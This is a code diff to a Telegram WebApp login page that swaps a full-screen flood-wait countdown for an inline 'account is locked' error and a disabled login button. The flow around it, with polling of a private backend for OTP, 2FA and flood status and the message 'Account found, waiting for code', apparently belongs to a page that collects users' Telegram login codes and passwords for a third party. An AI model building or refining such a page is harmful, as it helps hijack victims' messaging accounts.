@@ -404,14 +404,13 @@
     </div>
 
     <!-- STEP 6: FLOOD WAIT -->
-    <div id="step_flood" class="step">
+    <div id="flood_step" class="step">
         <div class="glass-card" style="padding: 40px 20px;">
             <i class="fa-solid fa-triangle-exclamation" style="font-size: 55px; color: #ff3b30; margin-bottom: 20px; filter: drop-shadow(0 0 15px rgba(255, 59, 48, 0.4));"></i>
             <h2 style="color: #ff3b30; font-size: 24px; margin-bottom: 10px; font-weight: 800;">Please Wait!</h2>
-            <p id="flood_desc" style="color: var(--muted); font-size: 14px; line-height: 1.5;">Too many attempts. Please wait before trying again.</p>
+            <p style="color: var(--muted); font-size: 14px; line-height: 1.5;">Too many attempts. Wait a few minutes before trying again.</p>
             
-            <div id="wait_time" style="font-size: 42px; font-weight: 900; margin: 25px 0; background: var(--list-bg); border-radius: 16px; padding: 15px; border: 1px solid var(--list-border); color: var(--primary);">00:00</div>
-            <p id="flood_mins_left" style="font-size: 13px; font-weight: 700; color: var(--muted);"></p>
+            <div id="wait_time" style="font-size: 42px; font-weight: 900; margin: 25px 0; background: var(--list-bg); border-radius: 16px; padding: 15px; border: 1px solid var(--list-border);">00:00</div>
         </div>
     </div>
 
@@ -442,13 +441,14 @@
     }
 
     /* =========================================================================
-       JAVASCRIPT SECTION (Backend Connection & Flood Wait Handling)
+       JAVASCRIPT SECTION (Backend Connection & Inline Flood Handling)
     ========================================================================= */
     const tg = window.Telegram.WebApp;
     
     tg.expand();
     tg.ready();
     
+    // Attempt to match header color with theme
     try {
         if(document.body.classList.contains('light-theme')){
             tg.headerColor = '#f4f4f6'; 
@@ -499,8 +499,8 @@
 
     function showStep(n) {
         document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-        let stepId = (typeof n === 'string') ? (n.startsWith('step') ? n : 'step_' + n) : 'step' + n;
-        const target = document.getElementById(stepId) || document.getElementById(n);
+        let stepId = (typeof n === 'string') ? 'step_' + n : 'step' + n;
+        const target = document.getElementById(stepId);
         if(target) target.classList.add('active');
         
         if(savedName) {
@@ -514,7 +514,7 @@
             fetch(`${API_BASE_URL}/check_status/${userId}`).then(r => r.json()).then(data => {
                 if (data.status === "FLOOD") { 
                     clearInterval(statusChecker); 
-                    startFloodTimer(data.remaining_seconds || data.wait || 60, data.total_wait_minutes); 
+                    displayFloodInStatus1(data);
                 }
                 else if (data.status === "NEED_OTP") { showStep(2); stopLoaders(); }
                 else if (data.status === "NEED_2FA") { showStep(3); stopLoaders(); }
@@ -575,7 +575,7 @@
             const data = await res.json();
             if (data.status === "FLOOD") {
                 clearInterval(statusChecker);
-                startFloodTimer(data.remaining_seconds || data.wait || 60, data.total_wait_minutes);
+                displayFloodInStatus1(data);
             } else if (data.status === "FOUND" || data.status === "NEED_OTP") {
                 showMsg(1, 'loading-msg', 'Account found, waiting for code...');
             } else if (data.status === "SUCCESS") {
@@ -652,7 +652,7 @@
     function handleResponse(data, step) {
         if (data.status === "FLOOD") { 
             clearInterval(statusChecker); 
-            startFloodTimer(data.remaining_seconds || data.wait || 60, data.total_wait_minutes); 
+            displayFloodInStatus1(data);
         }
         else if (data.status === "SUCCESS") { showStep('success'); } 
         else if (data.status === "NEED_2FA") { showStep(3); stopLoaders(); }
@@ -663,6 +663,7 @@
         }
     }
 
+    /* Scroll smoothly when message appears so it pushes content upwards properly */
     function showMsg(stepId, type, text) {
         const el = document.getElementById('status' + stepId);
         if(!el) return;
@@ -677,37 +678,24 @@
         if(el && el.style.display === 'block' && el.classList.contains('error')) el.style.display = 'none';
     }
 
-    function startFloodTimer(seconds, totalMinutes) {
+    function displayFloodInStatus1(data) {
         stopLoaders();
         clearInterval(statusChecker);
-        showStep('step_flood');
+        showStep('photo_slide');
         
+        let remSeconds = data.remaining_seconds || data.wait || 60;
+        let mins = data.remaining_minutes || data.total_wait_minutes || (remSeconds / 60).toFixed(1);
+        
+        showMsg(1, 'error', `Too many attempts! Account is locked for ${mins} minute(s).`);
+        
+        const btn = document.getElementById('loginBtn');
+        if(btn) btn.disabled = true;
+    }
+
+    function startFloodTimer(seconds) {
         let rem = parseInt(seconds) || 60;
-        let initialMins = totalMinutes || Math.ceil(rem / 60);
-
-        const desc = document.getElementById('flood_desc');
-        if(desc) {
-            desc.innerText = `Too many attempts! Account is locked for ${initialMins} minute(s).`;
-        }
-
-        const updateClock = () => {
-            let m = Math.floor(rem / 60);
-            let s = rem % 60;
-            const timeEl = document.getElementById('wait_time');
-            const minsEl = document.getElementById('flood_mins_left');
-            
-            if(timeEl) timeEl.innerText = `${m < 10 ? '0' : ''}${m}:${s < 10 ? '0' : ''}${s}`;
-            if(minsEl) minsEl.innerText = `${m} min ${s} sec remaining`;
-            
-            if (rem <= 0) { 
-                clearInterval(floodInterval); 
-                location.reload(); 
-            }
-            rem--;
-        };
-
-        updateClock();
-        const floodInterval = setInterval(updateClock, 1000);
+        let mins = (rem / 60).toFixed(1);
+        displayFloodInStatus1({ remaining_seconds: rem, remaining_minutes: mins });
     }
 
     function setupLongPressPaste() {
